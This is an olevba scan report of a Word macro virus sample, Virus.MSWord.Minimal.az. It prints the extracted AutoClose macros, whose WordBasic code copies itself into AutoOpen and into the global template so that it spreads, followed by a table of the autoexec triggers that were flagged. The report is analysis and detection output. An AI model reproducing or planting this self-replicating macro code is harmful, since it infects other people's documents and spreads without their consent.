olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Minimal.az-835b27713398db1f92899d8ac713e7f4ed866cc1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Minimal.az-835b27713398db1f92899d8ac713e7f4ed866cc1 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoClose1.bas 
in file: Virus.MSWord.Minimal.az-835b27713398db1f92899d8ac713e7f4ed866cc1 - OLE stream: 'Macros/VBA/AutoClose1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
On Error Resume Next
WordBasic.FileSaveAs Format:=1: WordBasic.MacroCopy "AutoClose", WordBasic.[FileName$]() + ":AutoOpen"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "AutoClose"
WordBasic.FileSave
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoClose2.bas 
in file: Virus.MSWord.Minimal.az-835b27713398db1f92899d8ac713e7f4ed866cc1 - OLE stream: 'Macros/VBA/AutoClose2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
On Error Resume Next
WordBasic.FileSaveAs Format:=1: WordBasic.MacroCopy "AutoClose", WordBasic.[FileName$]() + ":AutoOpen"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "AutoClose"
WordBasic.FileSave
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
